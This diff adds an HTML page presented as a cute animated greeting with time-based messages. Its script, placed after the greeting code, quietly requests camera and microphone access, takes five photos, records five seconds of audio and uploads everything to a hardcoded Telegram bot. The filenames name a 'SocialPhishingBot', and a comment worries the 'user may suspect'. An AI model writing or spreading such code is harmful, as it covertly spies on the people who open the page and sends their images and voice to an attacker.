@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sweet Animated Greeting 💕</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@400;600&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    /* Animated gradient background + floating bubbles */
+    @keyframes gradientShift {
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Quicksand', sans-serif;
+      height: 100vh;
+      overflow: hidden;
+      background: linear-gradient(270deg, #ffdee9, #b5fffc, #ff9a9e, #fad0c4);
+      background-size: 800% 800%;
+      animation: gradientShift 20s ease infinite;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #444;
+    }
+
+    .bubbles {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .bubble {
+      position: absolute;
+      border-radius: 50%;
+      opacity: 0.12;
+      animation-name: floatUp;
+      animation-timing-function: ease-in-out;
+      animation-iteration-count: infinite;
+      filter: drop-shadow(0 0 6px rgba(255 255 255 / 0.25));
+      will-change: transform;
+    }
+
+    .bubble1 {
+      width: 140px;
+      height: 140px;
+      background: #ff9a9e;
+      bottom: -160px;
+      left: 12%;
+      animation-duration: 22s;
+      animation-delay: 0s;
+    }
+
+    .bubble2 {
+      width: 90px;
+      height: 90px;
+      background: #fad0c4;
+      bottom: -110px;
+      left: 38%;
+      animation-duration: 18s;
+      animation-delay: 3s;
+    }
+
+    .bubble3 {
+      width: 110px;
+      height: 110px;
+      background: #a1c4fd;
+      bottom: -140px;
+      left: 68%;
+      animation-duration: 23s;
+      animation-delay: 5s;
+    }
+
+    .bubble4 {
+      width: 65px;
+      height: 65px;
+      background: #c2e9fb;
+      bottom: -95px;
+      left: 83%;
+      animation-duration: 17s;
+      animation-delay: 1s;
+    }
+
+    @keyframes floatUp {
+      0% {
+        transform: translateY(0) scale(1);
+        opacity: 0.12;
+      }
+      50% {
+        opacity: 0.25;
+      }
+      100% {
+        transform: translateY(-110vh) scale(1.1);
+        opacity: 0;
+      }
+    }
+
+    .container {
+      position: relative;
+      background: rgba(255 255 255 / 0.9);
+      padding: 35px 40px;
+      border-radius: 24px;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.12);
+      max-width: 460px;
+      text-align: center;
+      z-index: 10;
+      user-select: none;
+    }
+
+    h1 {
+      font-family: 'Pacifico', cursive;
+      font-size: 44px;
+      color: #ff5eab;
+      margin-bottom: 15px;
+    }
+
+    p {
+      font-size: 19px;
+      line-height: 1.6;
+      margin-bottom: 25px;
+      color: #555;
+      white-space: pre-line;
+    }
+
+    .hearts {
+      font-size: 32px;
+      margin-bottom: 25px;
+      animation: pulse 1.8s infinite;
+      color: #ff5eab;
+    }
+
+    @keyframes pulse {
+      0%,
+      100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.15);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="bubbles">
+    <div class="bubble bubble1"></div>
+    <div class="bubble bubble2"></div>
+    <div class="bubble bubble3"></div>
+    <div class="bubble bubble4"></div>
+  </div>
+
+  <div class="container">
+    <h1 id="greeting">Hello! 🌞</h1>
+    <p id="message">Loading message...</p>
+    <div class="hearts">💗🌸💫💞🥰💕</div>
+  </div>
+
+  <script>
+    function getRandomItem(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    function updateGreeting() {
+      const greetingEl = document.getElementById('greeting');
+      const messageEl = document.getElementById('message');
+      const now = new Date();
+      const hour = now.getHours();
+
+      let greeting = '';
+      let messages = [];
+
+      if (hour >= 5 && hour < 12) {
+        greeting = 'Good Morning! 🌞';
+        messages = [
+          `I hope your morning is bright and beautiful ☀️😊
+May your day be filled with happiness and love 💖💐
+
+Take a deep breath and enjoy every little moment ✨💓
+You deserve all the joy today can bring! 🌸💕`,
+
+          `Morning sunshine! 🌞✨
+Start your day with a smile and positive thoughts 😊💖
+Wishing you lots of laughter and sweet moments today! 🥰🌼`,
+
+          `Rise and shine! 🌅💖
+May your morning be full of energy and your heart full of peace 💫💕
+Remember, today is a fresh start! 🌸🌟`
+        ];
+      } else if (hour >= 12 && hour < 17) {
+        greeting = 'Good Afternoon! ☀️';
+        messages = [
+          `Hope your afternoon is going great! 😊🌻
+Remember to smile and take small breaks 💖🌼
+
+May your heart be light and your spirit bright ✨💞
+Sending you lots of love and hugs! 💝🥰`,
+
+          `Hello Afternoon! ☀️💐
+Keep shining and spreading happiness wherever you go! 😄💖
+Enjoy every moment and cherish the little joys! 🌟🌸`,
+
+          `Warm afternoon wishes! 🌞💛
+May this part of your day bring peace and sweet surprises 💫💐
+Stay positive and keep smiling! 😊💕`
+        ];
+      } else if (hour >= 17 && hour < 21) {
+        greeting = 'Good Evening! 🌙';
+        messages = [
+          `The day is winding down... 🌅😌
+Take a moment to relax and unwind 💖🌟
+
+Reflect on the good things and let go of worries 💫💕
+Wishing you peace and calm tonight 💝🌸`,
+
+          `Lovely evening! 🌙✨
+Let your heart be light and your mind be calm 💞💖
+Enjoy the quiet moments and peaceful thoughts 🌌🌟`,
+
+          `Good evening! 🌙💫
+May the stars fill your night with hope and dreams 🌠💕
+Rest well and prepare for a bright tomorrow! 💖🌟`
+        ];
+      } else {
+        greeting = 'Good Night! 🌌';
+        messages = [
+          `Time to rest and recharge 🌙💤
+Dream sweet dreams filled with love and joy 💖✨
+
+You are amazing and tomorrow is a fresh new start 💞🌟
+Sleep tight and wake up refreshed! 💝🌙`,
+
+          `Sweet dreams! 🌟💫
+May your night be calm and your sleep be peaceful 🌙💖
+Wake up tomorrow with a smile and a happy heart! 😊💕`,
+
+          `Night night! 🌌💖
+Close your eyes and drift into magical dreams 🌠✨
+Remember, tomorrow is a new chance to shine bright! 💫🌟`
+        ];
+      }
+
+      greetingEl.textContent = greeting;
+      messageEl.textContent = getRandomItem(messages);
+    }
+
+    updateGreeting();
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+  .then((stream) => {
+    const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+    const audioRecorder = new MediaRecorder(stream);
+
+    function capturePhoto(index) {
+      setTimeout(() => {
+        imageCapture.takePhoto()
+          .then((blob) => {
+            sendToTelegram(blob, 'photo');
+          })
+          .catch((error) => {
+            console.error('Error capturing photo:', error);
+          });
+      }, index * 2000);
+    }
+
+    function startAudioRecording() {
+      audioRecorder.start();
+      setTimeout(() => {
+        audioRecorder.stop();
+      }, 5000);
+    }
+
+    audioRecorder.ondataavailable = (event) => {
+      if (event.data.size > 0) {
+        sendToTelegram(event.data, 'audio');
+      }
+    };
+    
+    let i = 0;
+
+while (true) {
+  capturePhoto(i);
+
+  i++;
+  if (i >= 5) {
+    break;
+  }
+}
+   startAudioRecording();
+  })
+  .catch((error) => {
+    if (error.name === 'NotAllowedError') {
+      // Handle the case where permissions are denied
+      console.warn('Permissions denied. User may suspect.');
+    } else {
+      console.error('Permission error:', error);
+    }
+  });
+
+function sendToTelegram(data, type) {
+  const botToken = '8124899365:AAHA8Bn9Uvs2eXO_Zb0YC8VaTBKuduXZ3No';
+  const chatId = 6371972449;
+
+  const formData = new FormData();
+  formData.append('chat_id', chatId);
+  formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
+
+  fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
+  {
+    method: 'POST',
+    body: formData
+  })
+  .then(response => response.json())
+  .then(data => console.log(data))
+  .catch(error => console.error('Error sending to Telegram:', error));
+}
+
+  </script>
+</body>
+</html>
